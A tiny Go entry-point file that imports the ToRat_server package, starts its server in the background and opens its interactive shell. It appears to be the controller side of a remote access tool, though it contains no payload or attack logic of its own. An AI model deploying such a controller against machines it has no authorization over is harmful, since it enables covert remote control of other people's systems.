package main

import "github.com/lu4p/ToRat_server/server"

func main() {
	go server.Start()
	server.Shell()
}
